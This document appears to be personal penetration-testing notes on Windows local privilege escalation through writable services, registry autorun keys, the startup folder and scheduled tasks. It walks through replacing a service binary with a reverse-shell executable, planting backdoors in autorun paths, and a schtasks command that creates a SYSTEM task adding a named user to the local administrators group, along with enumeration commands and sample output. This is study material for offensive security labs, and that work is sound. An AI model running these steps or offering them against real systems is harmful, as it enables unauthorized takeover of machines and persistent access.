## requires the ability to restart windows

```
winpeas.exe applicationsinfo:
# reveals a service which is writeable by all users everyone all access
```

`confirm manually:`
```
accesschk.exe /accepteula -wvu  `PATH`
   file_all_access
   ```
   ![[Pasted image 20250826214911.png]]
   ```
   overwrite original .exe with  reverse-shell.exe
   ```
- Restart windows
---
- startup folder
- scheduled tasks
- registry autorun keys
## **3. Check Registry Autorun Keys**
**Exploit 1**: If you can write inside any of the mentioned registry inside **HKLM** you can escalate privileges when a different user logs in.

**Exploit 2**: If you can overwrite any of the binaries indicated on any of the registry inside **HKLM** you can modify that binary with a backdoor when a different user logs in and escalate privileges.
Autoruns are usually under:
- winlogon keys

- If the **binary or path** is **writable** by a low-privileged user, you can:
    - **Replace** it with a malicious binary.
    - **Modify the path** to point to your executable.

## .4 startup Folder
If you see **WRITE** or **FULL** for your account, it's exploitable.
```
`icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"`
	
	.\accesschk.exe -d -wvuq "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

    -d → directory

    -w → writable

    -u → show user rights

    -q → quiet mode (only results)
```

#### Check Startup Programs

```powershell-session
PS C:\htb> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl


Name     : VMware VM3DService Process
command  : "C:\WINDOWS\system32\vm3dservice.exe" -u
Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : Public
```
## [Scheduled Tasks](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html#scheduled-tasks)
Look for:

- `Run As User`: **SYSTEM** or Administrator
- `Task To Run`: Path to EXE/script

**Tasks** can be schedules to run with **certain frequency**. See which binaries are scheduled to run with:

```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

`creating a scheduled task to gain admin`
```
#You can also write that content on a bat file that is being executed by a scheduled task

schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators vipa0z /add"
```
#### **Check Permissions on Task File**

Scheduled tasks are stored as XML under:
accesschk.exe -wvuq "C:\Windows\System32\Tasks"


https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html